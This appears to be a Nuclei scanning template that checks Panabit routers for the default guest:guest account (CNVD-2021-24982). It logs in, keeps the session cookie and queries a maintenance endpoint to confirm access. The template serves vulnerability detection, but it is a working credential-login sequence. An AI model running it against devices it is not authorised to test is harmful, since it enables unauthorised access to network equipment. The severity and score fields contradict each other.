id: panabit-router-default-password-cnvd-2021-24982
info:
  name: Panabit Router Default Password
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Panabit router has a default password. Attackers can log in through guest:guest,
    check the system status, and configure the device.
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-24982
  classification:
    cve-id: CNVD-2021-24982
    cvss-score: 0.0
  tags: defaultaccount

variables:
  credentials: "username=guest&password=guest&code=&pacheckcode=0"

flow: http(1) && http(2)

http:
  - id: initial-login
    method: POST
    path:
      - "{{BaseURL}}/login/userverify.cgi"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "{{credentials}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Set-Cookie"
    extractors:
      - type: regex
        name: session_cookie
        group: 1
        part: header
        regex:
          - "Set-Cookie: ([^;]+);"
        internal: true

  - id: maintain-ajax-top
    method: POST
    path:
      - "{{BaseURL}}/cgi-bin/Maintain/ajax_top"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: "{{session_cookie}}; pacheckcode=0; paremcheck=0; xxxxxxx=; yyyyyyy=; lang=zh"
    body: "action=sysrun"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "sysrun"
